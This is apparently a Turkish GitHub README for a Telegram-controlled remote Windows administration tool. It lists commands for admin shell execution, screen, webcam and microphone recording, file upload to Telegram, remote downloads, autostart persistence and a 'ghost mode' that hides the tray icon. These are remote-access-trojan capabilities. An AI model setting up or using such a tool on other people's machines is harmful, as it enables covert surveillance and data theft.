# Uzak-Windows-Yönetimi-Aracı
Telegram uçlu, toplu ya da tekil Uzak Windows Yönetimi Aracı.

<a href="https://github.com/ny4rlk0/Uzak-Windows-Yonetimi-Araci/releases/download/TelegramRemoteAccessBot_1_0_0_36_Final/TelegramRemoteAccessBot_1_0_0_36_Final.zip">İndir</a>

ffmpeg.exe dosyasını aşağıdaki yola koyun. Release içinde var!

/TelegramRemoteAccessBot/bin/x86/Release/ffmpeg.exe

<a href="https://github.com/ny4rlk0/Remote-Access-Tool-Telegram">Eski Sürümü</a>

Hızlı Kullanımı:
Botunuzu botfatherden oluşturup ilgili bilgileri token sekmesine girin. Eğer gruptan kullanmak istiyorsanız, botunuzu gruba ekleyin, admin yetkisi ve mesajlara erişim verin. Eğer sadece bota mesaj atarak kullanmak istiyorsanız, botfatherdan Botunuzun gruba eklenmesini kapatın. TelegramUserID'nizi lisans sekmesine girin. Programı yeniden başlatın. Eğer Telegram User Id değerinizi bilmiyorsanız Telegramdan bota /userid yazın ve Telegram User Id sayınızı öğrenin. Daha sonra token sekmesine bu bilgiyi girin ve duruma göre kaydedin veya değiştirin. Botu yeniden başlatın. 

Telegram komutları:

/menu, /key, /menü
Komut menüsünü açar.

/ss
Bilgisayara bağlı tüm monitörlerden ekran alıntısı alır ve size resim olarak yollar.

/cmd "komut"
Komut satırında yazılan komutu yönetici olarak çalıştırır. Sonucunu size yazı olarak mesaj atar.

/ps "komut"
Power shellde yazılan komutu yönetici olarak çalıştırır. Sonucu size yazı olarak mesaj atar.

/log
Sohbette yazılan mesajları yazı olarak log.txt dosyasına kaydeder. İlk yazıldığında etkinleşir. Tekrar yazıldığında devre dışı bırakılır. Botta oluşan hata mesajlarını bu şekilde görebilirsiniz.

/ip
Bilgisayara bağlı olan ağ kartlarının özelliklerini ve ip adreslerini atar.

Örnek:

Adapter Name: Wi-Fi
DESC:TP-Link Wireless USB Adapter
GUID:{AWD3VAWD-AW1EDAW-AW2AWDA-3WDAWDWD}
MAC:C0:08:C5:DD:FF:GG:EE
Yerel Ağ IP:192.168.1.128
İnternet IP: 96.125.222.76

/video, /video 5
Bilgisayarın ana ekranını video ve medya ve sistem sesleri olarak 60 saniye boyunca kaydeder. Size video olarak atar. Sonuna 5 sayısını eklerseniz üst üste 5 defa 60 saniyelik yani toplamda 5 dakikalık kayıt alıp video olarak mesaj atar. Bu sürede bota mesaj atmayın. Bu süre zarfında bota atılan mesajlar komut bittikten sonra çalıştırılır.

/audio, /audio 5, /ses, /ses 5
Bilgisayara takılı bir mikrofon yoksa size bunu mesaj olarak belirtir. Eğer takılı bir mikrofon varsa 60 saniye boyunca kaydeder. Size ses dosyası olarak atar. Sonuna 5 sayısı eklerseniz üst üste 5 defa 60 saniyelik yani toplamda 5 dakikalık kayıt alıp video olarak mesaj atar. Bu sürede bota mesaj atmayın. Bu süre zarfında bota atılan mesajlar komut bittikten sonra çalıştırılır.

/webcam, /cam, /snap, /foto, /fotoğraf
Bilgisayara takılı bir kamera yoksa size bunu mesaj olarak belirtir. Eğer takılı bir kamera varsa bir fotoğraf çeker. Size fotoğraf olarak atar.

/camvideo, /recordvideo, /capvid, /cv, /cv 5
Bilgisayara takılı bir kamera yoksa size bunu mesaj olarak belirtir. Eğer takılı bir kamera varsa 60 saniye boyunca bu kameradan (varsa) mikrofonla birlikte video kaydeder. Size video dosyası olarak atar. Sonuna 5 sayısı eklerseniz üst üste 5 defa 60 saniyelik yani toplamda 5 dakikalık kayıt alıp video olarak mesaj atar. Bu sürede bota mesaj atmayın. Bu süre zarfında bota atılan mesajlar komut bittikten sonra çalıştırılır.

/start C:\ABC.EXE
Dosya yolu verilen programı arka planda çalıştırır.

/starto C:\ABC.EXE
Dosya yolu verilen programı ön planda çalıştırır.

/kill program_adi
Adı verilen program eğer çalışıyorsa programı sonlandırır. (sonuna nokta ya da exe uzantısını eklemeyin. )

/download https:\\siteadi.com\metin_dosyasi.txt
Linki verilen programı, linkten program adını ayırarak indirir. Daha sonra aynı program adı ile botun çalıştığı dizine kaydeder.

/upload C:\ABC.EXE 
Dosya yolu verilen dosyayı (50 MB aşmamak kaydı ile) Telegrama yükleyerek size mesaj olarak atar. Exe dosyası olması gerekmiyor tek bir dosya olduğu sürece uzantısı farketmeden atabilirsiniz.

/add logon
Botun şu anki çalışan kullanıcı hesabında her oturum açıldığında bot otomatik başlar. (İnternet yoksa başlamayabilir.)

/remove logon
Botun şu anki çalışan kullanıcı hesabında her oturum açıldığında bot otomatik başlaması özelliğini kapatır.

/add start
Botun bilgisayar her açıldığında otomatik başlar. (İnternet yoksa başlamayabilir.)

/remove start
Botun bilgisayar her açıldığında otomatik başlaması özelliğini kapatır.

/lic,
Lisans durumunuzu kontrol eder.

/ghoston
Kalıcı olarak Hayalet Modu açılır. Sistem tepsisindeki simge gizlenir.

/ghostoff
Kalıcı olarak Hayalet Modu kapatılır. Sistem tepsisindeki simge yeniden gösterilir.

/uuid gen
Bilgisayara 10 karakter ve rakam karışık bir uuid değeri oluşturur.

/uuid clear uuid_değeri
Bilgisayarın uuid değerini kaldırır.

/uuid get
Bilgisayarın uuid değerini görüntüler.

/uuid set ABCDEF
Bilgisayarın uuid değerini ABCDEF olarak ayarlar.

/uuid uuid_değeri /ss
Uuid değeri eşleşen bilgisayarda /ss komutunu çalıştırır. /ss yerine farklı komutlar kullanabilirsiniz.

/updateonline

/updateoffline

/updatekb
/updatekb KB12345 şeklinde kullanılır ve sisteminiz için eşleşen bir güncelleme bulunursa yüklenir.

/exit
Bilgisayarda çalışan botu kapatır. Tekrar bilgisayarın yanına gidip çalıştırmanız gerekir.
